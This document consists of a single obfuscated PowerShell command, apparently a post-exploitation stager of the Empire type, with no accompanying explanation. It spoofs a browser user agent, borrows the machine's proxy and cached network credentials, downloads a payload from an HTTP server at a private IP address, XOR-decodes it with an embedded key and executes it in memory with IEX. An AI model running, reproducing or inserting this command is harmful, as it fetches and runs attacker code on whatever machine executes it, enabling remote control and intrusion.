
$Wc=New-ObjEct SYSTeM.Net.WEbClIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEadErs.AdD('User-Agent',$u);$WC.PRoxY = [SYsTEm.NeT.WeBReQUeSt]::DEFaulTWebPRoXy;$WC.PROXy.CrEdeNtIalS = [SysTeM.NET.CredEntIalCAche]::DefaULtNEtWORKCreDentIAlS;$K='9e5cb5679e5159a5910990d490d8920a';$i=0;[ChAR[]]$b=([CHar[]]($wc.DoWnLOADSTriNG("http://192.168.164.180:8080/index.asp")))|%{$_-bXoR$k[$i++%$K.LengTh]};IEX ($b-jOIn'')

